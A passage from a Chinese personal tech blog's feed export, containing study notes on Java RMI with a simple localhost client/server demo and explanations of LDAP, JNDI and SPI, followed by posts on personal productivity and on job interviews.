prices.get(description);</span><br><span class="line">    <span class="keyword">return</span> price == <span class="keyword">null</span> ? <span class="number">0</span> : price;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>WarehouseServer.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Title</span>: WarehouseServer.java  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Package</span> warehouse  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 直接构造并且注册一个WarehouseImpl对象</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment">* <span class="doctag">@date</span> 2019年8月25日  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@version</span> V1.0  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@ClassName</span>: WarehouseServer  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 实例化WarehouseImpl对象，并用naming service来将它注册，并等待客户端来调用</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarehouseServer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment"> * 使用LocateRegistry和Naming两个类来完成一个简单的RMI Demo</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Title</span>: main  </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NamingException </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">System.out.print(<span class="string">&quot;Constructing server implemention...&quot;</span>);</span><br><span class="line">WarehouseImpl centralWarehouse = <span class="keyword">new</span> WarehouseImpl();</span><br><span class="line">System.out.println(<span class="string">&quot;Ok&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * LocateRegistry is used to obtain a reference to a bootstrap</span></span><br><span class="line"><span class="comment"> * remote object registry on a particular host (including the local host), or</span></span><br><span class="line"><span class="comment"> * to create a remote object registry that accepts calls on a specific port.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//创建远程对象的注册表，指明其服务的端口。</span></span><br><span class="line">LocateRegistry.createRegistry(<span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Sets the system property indicated by the specified key.设置系统属性</span></span><br><span class="line">System.setProperty(<span class="string">&quot;rmi:central_warehouse&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line"><span class="comment">//这里前面的键值对的键名可以去掉&quot;rmi&quot;(实测)，为了区别还是加上吧</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定远程对象到注册表，这里的&quot;rmi://&quot;必须要加上，提供一个URL来访问你的远程对象</span></span><br><span class="line">System.out.print(<span class="string">&quot;Binding server implemention to registry...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//The Naming class provides methods for storing and obtaining references to remote objects in a remote object registry. </span></span><br><span class="line">Naming.bind(<span class="string">&quot;rmi://localhost:8888/central_warehouse&quot;</span>, centralWarehouse);</span><br><span class="line">System.out.println(<span class="string">&quot;Ok&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//等待客户端的连接</span></span><br><span class="line">System.out.println(<span class="string">&quot;waiting for invocations from clients&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;创建远程对象发生异常&quot;</span>);</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (AlreadyBoundException e) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;发生重复绑定对象异常&quot;</span>);</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (MalformedURLException e) &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;发生URL畸形异常&quot;</span>);</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>WarehouseClient.java<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Title</span>: WarehouseClient.java  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Package</span> warehouse  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 客户端获取指定服务器和远程对象的名字</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span> flo@t</span></span><br><span class="line"><span class="comment">* <span class="doctag">@date</span> 2019年8月25日  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@version</span> V1.0  </span></span><br><span class="line"><span class="comment">*/</span>  </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.NotBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@ClassName</span>: WarehouseClient  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: 客户端实现远程调用方法</span></span><br><span class="line"><span class="comment">*    </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WarehouseClient</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Title</span>: main  </span></span><br><span class="line"><span class="comment">* <span class="doctag">@Description</span>: TODO</span></span><br><span class="line"><span class="comment">* <span class="doctag">@author</span>: flo@t</span></span><br><span class="line"><span class="comment">* <span class="doctag">@param</span> args </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> NamingException </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//获得指定主机和指定端口上的注册表对象</span></span><br><span class="line">Registry registry = LocateRegistry.getRegistry(<span class="string">&quot;localhost&quot;</span>,<span class="number">8888</span>);</span><br><span class="line"><span class="comment">//Returns a reference to the remote object Registry on the specified host and port.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回的是Remote接口类型，这里进行一个向下的转型</span></span><br><span class="line">Warehouse centralWarehouse = (Warehouse) registry.lookup(<span class="string">&quot;central_warehouse&quot;</span>);</span><br><span class="line">String descr = <span class="string">&quot;Toaster&quot;</span>;</span><br><span class="line"><span class="keyword">double</span> price = centralWarehouse.getPrice(descr);</span><br><span class="line">System.out.println(descr + <span class="string">&quot;: &quot;</span> + price);</span><br><span class="line">&#125; <span class="keyword">catch</span> (NotBoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>使用 WarehouseClient.java 的运行结果：<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210401143757.png"><br>成功调用 getPrice 方法获取到 24.5。</li></ol><p>下面给出RMI工作的流程图:<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210401143901.png"></p><ul><li>服务器：将实例化后的对象绑定在注册表中，并等待客户端的调用。</li><li>客户端：使用lookup方法获取对象的引用，<strong>客户端所得到的结果实际上是在服务端那里执行完成的，服务端只是将这个结果返回给了请求者</strong>。<blockquote><p>疑问🤔️：那恶意代码挂载在自己服务器，是怎么反弹shell的呢？迷惑</p></blockquote></li></ul><h2 id="0x02-LDAP-是什么？"><a href="#0x02-LDAP-是什么？" class="headerlink" title="0x02 LDAP 是什么？"></a>0x02 LDAP 是什么？</h2><p>LDAP 是 <a href="https://baike.baidu.com/item/%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E5%8D%8F%E8%AE%AE">轻量目录访问协议</a>，英文全称是 Lightweight Directory Access Protocol。简单来说， 是一个为查询、浏览和搜索而优化的专业分布式数据库，它成树状结构组织数据，就好像 Linux/Unix 系统中的文件目录一样。</p><p>LDAP以树结构标识所以不能像表格一样用SQL语句查询，它“读”性能很强，但“写”性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p><p>LDAP可以绑定对象，实现远程方法调用。</p><h2 id="0x03-RMI-和-LDAP-的区别和联系"><a href="#0x03-RMI-和-LDAP-的区别和联系" class="headerlink" title="0x03 RMI 和 LDAP 的区别和联系"></a>0x03 RMI 和 LDAP 的区别和联系</h2><p>在使用 marshalsec 时，需要选择不同的协议 RMI 或 LDAP，但是又不太理解这两种方法的区别。这里摘录一下其他大佬博客对于这个的理解：<a href="https://lzwgiter.github.io/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5(%E4%B8%8A)/#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5%E5%92%8CRMI">传送门</a></p><blockquote><p>简单来说的话，大家应该都清楚RPC(Remote Procedure Call)的作用，RMI相当于就是Java版本的RPC，可以实现远程对一个实例化的对象的使用；而JNDI的作用提供了一组通用的接口可供应用很方便地去访问不同的后端服务，例如 LDAP、RMI、CORBA等。在Java中为了能够更方便的管理、访问和调用远程的资源对象，常常会使用 LDAP和RMI等服务来将资源对象或方法绑定在固定的远程服务端，供应用程序来进行访问和调用。</p></blockquote><p>简而言之，LDAP和RMI都可以绑定对象，进而实现远程方法调用。</p><h2 id="0x04-RMP-是什么？"><a href="#0x04-RMP-是什么？" class="headerlink" title="0x04 RMP 是什么？"></a>0x04 RMP 是什么？</h2><h2 id="0x05-JDNI-是什么？"><a href="#0x05-JDNI-是什么？" class="headerlink" title="0x05 JDNI 是什么？"></a>0x05 JDNI 是什么？</h2><p>JNDI即Java Naming and Directory Interface，就是一组在Java应用中访问命名与服务的API。为开发人员查找和访问资源提供了统一的通用接口，可以用来定位网络 机器 用户 对象等各种资源。JNDI底层提供了很多实现方式，有RMI LDAP CORBA等，这些服务器注册的服务可以通过JNDI提供的一个统一外部接口去访问调用。</p><ul><li>Java Naming：键值对的绑定，应用程序可通过键检索值</li><li>Java Directory：是对Java Naming的补充扩张。差别为Java Directory可以根据属性搜索对象。在目录服务中，JNDI允许访问文件系统中的文件，绑定在RMI服务器的对象，LDAP服务与其他组件。</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210401125932.png"></p><p>JNDI将名字与对象绑定，可以通过名字检索存储在RMI、LDAP服务器上的对象，所以提供了绑定与检索方法。</p><p>JNDI与RMI的关系可以理解为，JDBC和MySQL Driver的关系。</p><h2 id="0x07-SPI是什么？"><a href="#0x07-SPI是什么？" class="headerlink" title="0x07 SPI是什么？"></a>0x07 SPI是什么？</h2><p>SPI是Service Provider Interface的缩写，是JDK内置的服务发现协议。</p><p>SPI是一种动态替换发现的机制， 比如有个接口，想运行时动态的给它添加实现，你只需要添加一个实现。我们经常遇到的就是java.sql.Driver接口，其他不同厂商可以针对同一接口做出不同的实现，mysql和postgresql都有不同的实现提供给用户，而Java的SPI机制可以为某个接口寻找服务实现。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210401131153.png"></p><p>也就是一种典型的面向接口编程，让程序的鲁棒性和可拓展性更高。</p><p>问题6中的JDNI SPI也就是一个接口，可以连接LDAP和RMI等服务。</p><h2 id="0x06-为什么-Java-反序列化时和上面的各种协议紧密关联？"><a href="#0x06-为什么-Java-反序列化时和上面的各种协议紧密关联？" class="headerlink" title="0x06 为什么 Java 反序列化时和上面的各种协议紧密关联？"></a>0x06 为什么 Java 反序列化时和上面的各种协议紧密关联？</h2><h2 id="0x04-marshalsec-的原理是什么？"><a href="#0x04-marshalsec-的原理是什么？" class="headerlink" title="0x04 marshalsec 的原理是什么？"></a>0x04 marshalsec 的原理是什么？</h2><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="附录"><a href="#附录" class="headerlink" title="#附录"></a>#附录</h1><p>参考教程：</p><ol><li>Java RMI远程方法调用详解：<a href="https://blog.csdn.net/guyuealian/article/details/51992182">https://blog.csdn.net/guyuealian/article/details/51992182</a></li><li>总结：详解RMI与RPC的区别：<a href="https://zhuanlan.zhihu.com/p/50678735">https://zhuanlan.zhihu.com/p/50678735</a></li><li>RMI实现RPC：<a href="https://blog.csdn.net/u014565127/article/details/113583536">https://blog.csdn.net/u014565127/article/details/113583536</a></li><li>java ldap：<a href="https://blog.csdn.net/bobbykey/article/details/88966040">https://blog.csdn.net/bobbykey/article/details/88966040</a></li><li>系统工具 | LDAP 使用教程篇：<a href="https://aiden-dong.github.io/2019/05/08/Ldap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">https://aiden-dong.github.io/2019/05/08/Ldap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</a></li><li>Java教程 - 廖雪峰的官方网站：<a href="https://www.liaoxuefeng.com/wiki/1252599548343744">https://www.liaoxuefeng.com/wiki/1252599548343744</a></li><li>Java 反序列化漏洞与JNDI注入(上)：<a href="https://lzwgiter.github.io/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5(%E4%B8%8A)/">https://lzwgiter.github.io/Java%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8EJNDI%E6%B3%A8%E5%85%A5(%E4%B8%8A)/</a></li><li>【原创】（译）Java 序列化魔法方法及使用示例：<a href="https://juejin.cn/post/6844903936672038920#heading-0">https://juejin.cn/post/6844903936672038920#heading-0</a></li><li>Jedis存储Java对象–Java序列化为byte数组方式：<a href="https://www.cnblogs.com/linjiqin/archive/2013/05/29/3105608.html">https://www.cnblogs.com/linjiqin/archive/2013/05/29/3105608.html</a></li><li>Java基础：IO流之字节流和字符流：<a href="https://blog.csdn.net/axi295309066/article/details/52820203">https://blog.csdn.net/axi295309066/article/details/52820203</a></li><li>你真的会用Java io流吗？：<a href="https://www.javazhiyin.com/46874.html">https://www.javazhiyin.com/46874.html</a></li><li>JNDI注入入门：<a href="https://p0rz9.github.io/2019/05/05/JNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/">https://p0rz9.github.io/2019/05/05/JNDI%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/</a></li><li>java中extends和implements的区别，怎么用？：<a href="https://my.oschina.net/yongqingfan/blog/531166">https://my.oschina.net/yongqingfan/blog/531166</a></li><li>java远程调用之RMI（终于可以自己写代码控制别人电脑了）：<a href="https://zhuanlan.zhihu.com/p/80686193">https://zhuanlan.zhihu.com/p/80686193</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验分享】效率提升总结</title>
      <link href="3aae222bb2c3/"/>
      <url>3aae222bb2c3/</url>
      
        <content type="html"><![CDATA[<p>决定将《左耳听风-极客时间》中的「时间规划」方面的分享应用到自己的实际生活当中，并且记录自己的实践经历。</p><p>基本思想：反转控制，被动变主动。</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210324113219.png"></p><h1 id="1-如何做"><a href="#1-如何做" class="headerlink" title="1 如何做"></a>1 如何做</h1><p>假设有一些必须要完成的任务，需要高效率的完成，就需要考虑下面的问题：</p><ol><li>哪件事最紧急？</li><li>如何保证自己的专注？</li><li>如何保护专注状态的持久？<blockquote><p>目标：专注的做一件事。<br>需要解决的问题：被外界打扰、自己思绪打扰。</p></blockquote></li></ol><h2 id="0x01-如何确定目前最应该做的事？"><a href="#0x01-如何确定目前最应该做的事？" class="headerlink" title="0x01 如何确定目前最应该做的事？"></a>0x01 如何确定目前最应该做的事？</h2><ul><li>行程：平时在滴答清单中，将行程和行程信息进行记录，在行程前进行提醒，保证自己不会错过最重要的事情。及时对行程进行准备，让重要的事情做得更好。</li><li>焦虑：解决自己的焦虑。</li><li>兴趣：可以随性一点。</li></ul><h2 id="0x02-如何保证自己注意力集中？"><a href="#0x02-如何保证自己注意力集中？" class="headerlink" title="0x02 如何保证自己注意力集中？"></a>0x02 如何保证自己注意力集中？</h2><p>在确定当前需要做的事情之后,保持注意力集中是提升个人效率的关键：</p><ol><li>将问题进行分解之后，记录进入滴答清单。</li><li>选取 45 分钟能完成的任务。</li><li>45 分钟专注解决分解后的任务。</li><li>如果刚刚给自己安排的任务完成，回到第 2 步。如果给自己安排的任务不能完成，回到第 3 步。<blockquote><p>尽量保证自己大脑保持活跃。</p></blockquote></li></ol><h2 id="0x03-如何屏蔽干扰？"><a href="#0x03-如何屏蔽干扰？" class="headerlink" title="0x03 如何屏蔽干扰？"></a>0x03 如何屏蔽干扰？</h2><p>外界干扰：</p><ol><li>给周边的人一些信息，表明自己目前不愿意被打扰。</li><li>有人来打扰时，询问紧急程度，然后进行一定的规划。</li><li>使用耳塞。</li></ol><p>思想干扰：</p><ol><li>如果突然想到某件事<ol><li>重要。考虑切换任务</li><li>不重要。记录下来，等番茄时钟的完成后再解决。</li></ol></li></ol><h1 id="2-如何做得更好"><a href="#2-如何做得更好" class="headerlink" title="2 如何做得更好"></a>2 如何做得更好</h1><p>当使用 1 中的策略，可以高效的完成一件事时。就需要进一步考虑下面的问题：（核心思想：反转控制，化被动为主动）</p><ol><li>如何为自己挤时间？（提高自己）</li><li>哪些事情更重要？（把握重点）</li></ol><blockquote><p>目标：尽量保证自己做的事情有价值，事情能给自己带来较好的反馈。<br>note：反馈对于一个人的进步至关重要。</p></blockquote><h2 id="0x01-如何为自己挤时间？"><a href="#0x01-如何为自己挤时间？" class="headerlink" title="0x01 如何为自己挤时间？"></a>0x01 如何为自己挤时间？</h2><p>首先当拿到某个任务或者问题之后。先思考任务的前因后果，以及任务的必要性。如果去做没必要做的事情，就是浪费时间。</p><blockquote><p>学会说“不”：<br>a. 我可以加班加点完成，但是我不保证好的质量，有 bug 你得认，而且事后你要给我 1 个月的时间还债。<br>b. 我可以加班加点，还能保证质量，但我没办法完成这么多需求，能不能减少一些？<br>c. 我可以保质保量地完成所有的需求，但是，能不能多给我 2 周时间？</p></blockquote><p>此次，当任务的必要性确定后，可以进一步确定任务的复杂度，确定时间的复杂度。（小任务优先，容易得到反馈）</p><p>再其次，拆分任务，然后专注的完成这项任务。</p><h2 id="0x02-如何利用好自己的时间？"><a href="#0x02-如何利用好自己的时间？" class="headerlink" title="0x02 如何利用好自己的时间？"></a>0x02 如何利用好自己的时间？</h2><p>时间就像金钱一样，你得学会投资时间，把时间投资在有价值有意义的地方，你就会有“更多的时间”。</p><ul><li><strong>花时间学习基础知识，花时间读文档</strong>。系统地学习一门技术是非常关键的，所以这个时间是值得投资的。</li><li><strong>花时间在解放自己生产力的事上。</strong></li><li><strong>花时间在让自己成长的事上</strong>。把时间花在能让自己成长，能让自己有更强的竞争力，能让自己有更大的视野，能让自己有更多可能性的事情上。这样的时间投资才是有价值的。</li><li><strong>花时间在建立高效的环境上</strong>。</li><li><strong>花些时间在影响你身边的人上</strong>。</li></ul><blockquote><p>总体思想：关注长期利益规划。要多关注长远可以节省多少时间，而不是当前会花费多少时间。长期成本会比短期成本大得多。所以，宁可在短期延期，也不要透支未来。这里的逻辑是，工作上的事你永远也做不完的，长痛不如短痛。</p></blockquote><h1 id="3-聚沙成塔"><a href="#3-聚沙成塔" class="headerlink" title="3 聚沙成塔"></a>3 聚沙成塔</h1><p>前面 2 个小结的目标分别是“学会做有价值的事”、“学会做好有价值的事”，接下来这一节的目标则是：学会实现自己的目标。</p><h2 id="0x01-如何规划自己的行动？"><a href="#0x01-如何规划自己的行动？" class="headerlink" title="0x01 如何规划自己的行动？"></a>0x01 如何规划自己的行动？</h2><p>规划自己的行动计划，不是短期的，而是一个中长期的。</p><p>个人建议是按季度来规划，这个季度做什么，达到什么目标，一年往前走四步，而不是只考虑眼下。</p><h2 id="0x02-有哪些实践时需要注意的事项？"><a href="#0x02-有哪些实践时需要注意的事项？" class="headerlink" title="0x02 有哪些实践时需要注意的事项？"></a>0x02 有哪些实践时需要注意的事项？</h2><ol><li><strong>形成习惯</strong>。再好的方法，如果没有形成习惯，不能在实际的工作和生活中解决实际问题，都将成为空谈。形成习惯是实现目标的基石，三天打鱼两天晒网的生活难以实现目标。<strong>要有正反馈，也就是成就感，有助于完成一些看似难以完成的事儿。</strong></li><li><strong>将军赶路不追小兔</strong>。这个世界有太多的东西会让我们分心和跑偏。能专注地把时间投入到一个有价值的事上是非常重要的。<strong>确定自己的目标，专注达到这个目标，而不是分心</strong>。将军的目标是要攻城，而不是追兔子。</li><li><strong>反思和举一反三</strong>。可以尝试每周末花上点时间思考一下，本周做了哪些事儿？时间安排是否合理？还有哪些可以优化提高的地方？有点儿类似于我们常说的“复盘”。然后思考一下，下周的主要任务是什么？并根据优先级规划一下完成这些任务的顺序，也就是做一些下周的工作规划。</li></ol><h1 id="4-实践"><a href="#4-实践" class="headerlink" title="4 实践"></a>4 实践</h1><p>前面的种种思想都是摘录了《左耳听风-极客时间》中的思想，并没有进行实践。最后一个小结，将记录自己的实践过程中遇到的问题。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 时间规划 </tag>
            
            <tag> 效率提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【经验分享】面试总结</title>
      <link href="23f0f03d99ed/"/>
      <url>23f0f03d99ed/</url>
      
        <content type="html"><![CDATA[<p>以下是我的面试经历，我对于面试的看法，和我对于某些现象的看法。</p><hr><h2 id="0x01-常见的面试过程是怎样的？"><a href="#0x01-常见的面试过程是怎样的？" class="headerlink" title="0x01 常见的面试过程是怎样的？"></a>0x01 常见的面试过程是怎样的？</h2><p>我在这里转载以下「CoolShell」的一段话，我觉得讲得非常真实。<a href="https://coolshell.cn/articles/1870.html">传送门</a></p><p>对于传统的面试招聘过程，基本上来说都是下面这样的样子的：</p><ul><li>阅读应聘者的简历，让应聘者做个自我介绍。</li><li>问一些比较难的非常细节的技术问题，以一问一答的形式。</li><li>给面试者一些和几个编程难题。（比如某些怪异的算法题）</li></ul><p>我个人觉得这种面试方法很可笑，也很糟糕，尤其是后面两点。通常来说，这样的面试只会让你面试到一些“书呆子”或是一些“技术痴迷者”，下面让我来一条一条地剖析一下这几条的弊端。</p><p>你很难从一个人的简历或是自我介绍上了解一个人。因为这些都是当事人自己写的，或是自己阐述的。所以，这并不是很准确的，通过简历，你只能知道很简单的事情，这对于是否能招入团是远远不够的。而在面试的开始，让应聘者做自我介绍，只会让面试者以很正式的态度来面对整个面试。一但面试过程很正式，很严肃，就会让人很拘禁，其实，这并不是我们想要的，我要的是应聘者真实和自然的表现，从而才能了解到最真实的东西。</p><p>问几个技术细节的问题。比如：<strong>我个人经历过的——“ps的-a参数是什么意思？”，“vi中删除换行符的命令是什么？”，“C++的关键字explict,mutable是用来干什么？</strong>”等等，等等。以前做为一个应聘者来说，我非常讨厌这样的问题，<strong>因为这样的问题查一下手册就知道。难道他要招的是一个字典手册？</strong> 不是一个人？对于这方面，重要的不是知识，重要的是其查找知识的能力。</p><p>给应聘者一个或几个很难的算法题，给上十几分钟，然后让面试者把伪代码或是代码写下来。<strong>这样的做法是相当可笑的，不能讨论不能查资料，让人在一种压力状态下作答，这根本就不是实际工作中的状态，而我们的面试也就成了一种刁难（我最变态的经历是，当我把写在两页纸上的代码上交上去后，面试官把其交给旁边程序员输出电脑做校验，结果程序员说，编译出错。于是，面试官说，“很遗憾，可能你写的程序还不多”，相当可笑）</strong>。对于这点来说，重要的不是那个解题的答案，而是解题的思路和方法。</p><p>我以前经历过很多的面试，当技术人员来和我做面试的时候，我发现，“技术人员的思维”对于某些人来说根本分不清面试和考试，在潜意识里，他们在很多时候不是在面试这个人，而是在刁难这个人并以此展示自己的技能。<strong>我个人认为我是一个好的程序员，但我可以告诉你我无法通过那样的面试，因为那样的面试是为他们自己准备的，而不是为应聘者准备的。</strong></p><hr><h2 id="0x02-应该怎么看待面试？"><a href="#0x02-应该怎么看待面试？" class="headerlink" title="0x02 应该怎么看待面试？"></a>0x02 应该怎么看待面试？</h2><p>我最初的想法也是和 CoolShell 作者一样：</p><blockquote><p>他并不是在考察我的能力，很多问题只需要在搜索引擎搜索一下即可解决的问题。</p></blockquote><p>但我后面突然想到了「高考」，为什么会有高考的存在？面试不正是类似高考的存在吗？所以我现在的想法是：</p><blockquote><p>老老实实背题，并且最好能讲出你自己独到的见解，如果你背题也挤不进大厂，就真的只是能力问题，只能说明我是不过如此的男人。</p></blockquote><p>如果想要体现你的能力，那就用成果来证明。例如张小龙面试就只需要一句话，我做了微信。</p>]]></content>
      
      
      <categories>
          
          <category> 经验分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】区块链安全总结</title>
      <link href="8e9449344a04/"/>
      <url>8e9449344a04/</url>
      
